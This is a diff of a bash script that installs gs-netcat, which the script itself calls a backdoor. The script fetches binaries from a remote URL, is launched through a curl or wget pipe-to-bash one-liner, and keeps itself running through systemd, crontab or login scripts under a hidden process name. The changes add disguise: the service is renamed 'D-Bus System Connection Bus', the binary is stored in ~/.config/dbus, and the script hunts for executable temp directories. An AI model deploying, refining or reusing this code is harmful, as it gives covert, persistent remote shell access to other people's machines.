@@ -25,18 +25,23 @@
 # 		- Use binaries from ../packaging/gsnc-deploy-bin/
 #		- Verbose output
 #		- Shorter timeout to restart crontab etc
-#       - Also sets GS_USELOCAL=1
+#       - Often used like this:
+#         GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
 # GS_USELOCAL=1
 #       - Use local binaries (do not download)
+# GS_NOSTART=1
+#       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install backdoor
+# GS_OSARCH=x86_64-alpine
+#       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=path
 #		- Use 'path' instead of '/' (needed for packaging/testing)
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
 URL_DEPLOY="gsocket.io/x"
-GS_VERSION=1.4.32
+GS_VERSION=1.4.34
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
@@ -83,30 +88,58 @@ exit_alldone()
 	exit_code 0
 }
 
+# Test if directory can be used to store executeable
+# try_dstdir "/tmp/.gs-foobar/"
+# Return 0 on success.
+try_dstdir()
+{
+	local dstdir
+	dstdir="${1}"
+
+	# Create directory if it does not exists.
+	[[ ! -d "${dstdir}" ]] && { mkdir -p "${dstdir}" &>/dev/null || return 101; }
+
+	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
+	# Return if not writeable
+	touch "$DSTBIN" &>/dev/null || { return 102; }
+
+	# Test if directory is mounted with noexec flag and return success
+	# if binary can be executed from this directory.
+	ebin="/bin/true"
+	if [[ ! -e "$ebin" ]]; then
+		ebin=$(command -v id 2>/dev/null)
+		[[ -z "$ebin" ]] && return 0 # Try our best
+	fi
+	cp -a "$ebin" "$DSTBIN" &>/dev/null || return 0
+	"${DSTBIN}" &>/dev/null || { rm -f "${DSTDBIN}"; return 103; } # FAILURE
+
+	return 0
+}
+
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
+	if [[ -n "$GS_DSTDIR" ]]; then
+		try_dstdir "${GS_DSTDIR}" && return
+
+		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
+	fi
+
 	# Try systemwide installation first
-	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
-	# check_rwx_bin "$DSTBIN"
-	# [[ -n $IS_DIR_WREX ]] && return
-	touch "$DSTBIN" &>/dev/null && { return; }
+	try_dstdir "${GS_PREFIX}/usr/bin/" && return
 
 	# Try user installation
-	mkdir -p "${GS_PREFIX}${HOME}/.usr/bin" &>/dev/null
-	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
-	touch "$DSTBIN" &>/dev/null && { return; }
+	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return
 
-	# Try /tmp/.gs
-	DSTBIN="/tmp/.gs-${UID}/${BIN_HIDDEN_NAME}"
-	touch "$DSTBIN" &>/dev/null && { return; }
+	# Try /tmp/.gsusr-*
+	try_dstdir "/tmp/.gsusr-${UID}" && return
 
 	# Try /dev/shm as last resort
-	# This is often mounted noexec (e.g. docker) 
-	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
-	touch "$DSTBIN" &>/dev/null && { return; }
+	try_dstdir "/dev/shm/" && return
 
-	errexit "FAILED. Can not find writeable directory."
+	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	errexit
 }
 
 try_tmpdir()
@@ -123,34 +156,46 @@ init_vars()
 	# Select binary
 	local arch
 	arch=$(uname -m)
-	if [[ $OSTYPE == *linux* ]]; then 
-		if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
-			OSARCH="i386-alpine"
-		elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
-			OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
-		elif [[ "$arch" == "aarch64" ]]; then
-			OSARCH="aarch64-linux"
-		elif [[ "$arch" == "mips64" ]]; then
-			OSARCH="mips64-alpine"
-		elif [[ "$arch" == *mips* ]]; then
-			OSARCH="mips32-alpine"
-		fi
-	elif [[ $OSTYPE == *darwin* ]]; then
-		if [[ "$arch" == "arm64" ]]; then
-			OSARCH="x86_64-osx" # M1
-			# OSARCH="arm64-osx" # M1
-		else
-			OSARCH="x86_64-osx"
-		fi
-	elif [[ $OSTYPE == *FreeBSD* ]]; then
-			OSARCH="x86_64-freebsd"
-	elif [[ $OSTYPE == *cygwin* ]]; then
-			OSARCH="x86_64-cygwin"
-	# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
-			# OSARCH="i386-hurd" # debian-hurd
+
+	if [[ -z "$HOME" ]]; then
+		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
+		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
+		WARN "HOME not set. Using '$HOME'"
 	fi
 
-	[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
+	# User supplied OSARCH
+	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
+
+	if [[ -z "$OSARCH" ]]; then
+		if [[ $OSTYPE == *linux* ]]; then 
+			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
+				OSARCH="i386-alpine"
+			elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
+				OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
+			elif [[ "$arch" == "aarch64" ]]; then
+				OSARCH="aarch64-linux"
+			elif [[ "$arch" == "mips64" ]]; then
+				OSARCH="mips64-alpine"
+			elif [[ "$arch" == *mips* ]]; then
+				OSARCH="mips32-alpine"
+			fi
+		elif [[ $OSTYPE == *darwin* ]]; then
+			if [[ "$arch" == "arm64" ]]; then
+				OSARCH="x86_64-osx" # M1
+				# OSARCH="arm64-osx" # M1
+			else
+				OSARCH="x86_64-osx"
+			fi
+		elif [[ $OSTYPE == *FreeBSD* ]]; then
+				OSARCH="x86_64-freebsd"
+		elif [[ $OSTYPE == *cygwin* ]]; then
+				OSARCH="x86_64-cygwin"
+		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
+				# OSARCH="i386-hurd" # debian-hurd
+		fi
+
+		[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
+	fi
 
 	try_tmpdir "/dev/shm" ".gs-${UID}"
 	try_tmpdir "/tmp" ".gs-${UID}"
@@ -203,7 +248,7 @@ init_vars()
 
 	DEBUGF "SRC_PKG=$SRC_PKG"
 
-	[[ -n $GS_DEBUG ]] && GS_USELOCAL=1
+	# [[ -n $GS_DEBUG ]] && GS_USELOCAL=1
 }
 
 init_setup()
@@ -271,8 +316,8 @@ uninstall_rmdir()
 	[[ -z "$1" ]] && return
 	[[ ! -d "$1" ]] && return # return if file does not exist
 
+	rmdir "$1" 2>/dev/null || return
 	echo 1>&2 "Removing $1..."
-	rmdir "$1"
 }
 
 uninstall_rc()
@@ -294,17 +339,19 @@ uninstall_rc()
 # Rather important function especially when testing and developing this...
 uninstall()
 {
-	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
+	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
 	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
+	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"
 
 	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${SEC_NAME}"
+	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
 	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
 	uninstall_rm "/dev/shm/${SEC_NAME}"
 
-	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr/bin"
-	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr"
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
+	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
 	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
@@ -364,6 +411,7 @@ WARN_EXECFAIL_SET()
 
 WARN_EXECFAIL()
 {
+	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
 	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
 	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
 }
@@ -401,7 +449,7 @@ install_system_systemd()
 
 	# Create the service file
 	echo "[Unit]
-Description=gs
+Description=D-Bus System Connection Bus
 After=network.target
 
 [Service]
@@ -582,6 +630,7 @@ dl()
 	[[ -s "$2" ]] && return
 
 	# Need to set DL_CMD before GS_DEBUG check for proper error output
+	# DL_CMD is used for help output of how to uninstall
 	if [[ -n "$GS_USELOCAL" ]]; then
 		DL_CMD="./deploy-all.sh"
 	elif command -v curl >/dev/null; then
@@ -602,7 +651,9 @@ dl()
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
 	fi
+	[[ -n "$GS_USELOCAL" ]] && return # NOT REACHED
 
+	# HERE: It's either wget or curl (but not GS_USELOCAL)
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
@@ -626,7 +677,7 @@ gs_access()
 
 	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
-	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$?" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
 	[[ $ret -eq 61 ]] && {
 		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
 		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
@@ -676,19 +727,20 @@ test_bin()
 	bin="$1"
 
 	GS_SECRET=$("$bin" -g 2>/dev/null)
-	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$?" "wrong binary"; return; }
+	ret=$?
+	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }
 
 	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
-	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$?" "SIGSEGV"; return; }
+	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$ret" "SIGSEGV"; return; }
 	# 126 - Exec format error
 	# 255 && "connect(" match => Cannot connect to backend
 	[[ $ret -eq 255 ]] && [[ $err_log =~ connect\( ]] && { FAIL_OUT; errexit "Cannot connect to GSRN. Firewalled?"; }
 
 	# Fail unless it's ECONNREFUSED
-	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET 0 "default pkg failed"; return; }
+	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET "$ret" "default pkg failed"; return; }
 
 	# exit code of gs-netcat was ECONNREFUSED. Thus connection to server
 	# was successfully and server replied that no client is listening. 
@@ -696,14 +748,12 @@ test_bin()
 	IS_TESTBIN_OK=1
 }
 
-# try <osarch> <is_with_warning>
+# try <osarch>
 try()
 {
 	local osarch
-	local is_with_warning
 	local src_pkg
 	osarch="$1"
-	is_with_warning="$2"
 
 	src_pkg="gs-netcat_${osarch}.tar.gz"
 	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
@@ -731,7 +781,6 @@ try()
 	fi
 
 	rm -f "${TMPDIR}/${src_pkg}"
-	[[ -z "$is_with_warning" ]] && return # silent return
 }
 
 # Download the gs-netcat_any-any.tar.gz and try all of the containing
@@ -751,47 +800,10 @@ try_any()
 	else
 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 	fi
-	WARN_EXECFAIL
-	[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 }
 
-
-init_vars
-
-[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
-[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
-
-init_setup
-
-try "$OSARCH" 1
-[[ -z "$IS_TESTBIN_OK" ]] && try_any
-
-[[ -n "$GS_UPDATE" ]] && gs_update
-
-# S= is set. Do not install but connect to remote using S= as secret.
-[[ -n "$S" ]] && gs_access
-
-# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-[[ -n "$X" ]] && GS_SECRET="$X"
-
-# -----BEGIN Install permanentally-----
-# Try to install system wide. This may also start the service.
-[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
-
-# Try to install to user's login script or crontab
-[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" ]] && install_user
-
-[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
-# -----END Install permanentally-----
-
-if [[ -z "$IS_INSTALLED" ]]; then
-	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
-fi
-# After all install attempts output help how to uninstall
-echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
-
-printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
-if [[ -n "$IS_SYSTEMD" ]]; then
+gs_start_systemd()
+{
 	# HERE: It's systemd
 	if [[ -z "$IS_GS_RUNNING" ]]; then
 		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
@@ -807,7 +819,13 @@ if [[ -n "$IS_SYSTEMD" ]]; then
 	else
 		OK_OUT
 	fi
-elif [[ -z "$IS_GS_RUNNING" ]]; then
+}
+
+gs_start()
+{
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
+	[[ -n "$IS_GS_RUNNING" ]] && return
+
 	# Scenario to consider:
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
@@ -842,7 +860,51 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
 		IS_GS_RUNNING=1
 	fi
+}
+
+init_vars
+
+[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+
+init_setup
+
+try "$OSARCH"
+[[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
+WARN_EXECFAIL
+[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
+
+[[ -n "$GS_UPDATE" ]] && gs_update
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n "$S" ]] && gs_access
+
+# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+[[ -n "$X" ]] && GS_SECRET="$X"
+
+# -----BEGIN Install permanentally-----
+# Try to install system wide. This may also start the service.
+[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
+
+# Try to install to user's login script or crontab
+[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" ]] && install_user
+
+[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
+# -----END Install permanentally-----
+
+if [[ -z "$IS_INSTALLED" ]]; then
+	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
+# After all install attempts output help how to uninstall
+echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+
+printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+if [[ -n "$GS_NOSTART" ]]; then
+	SKIP_OUT "GS_NOSTART is set."
+else
+	gs_start
+fi
+
 
 echo -e 1>&2 "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
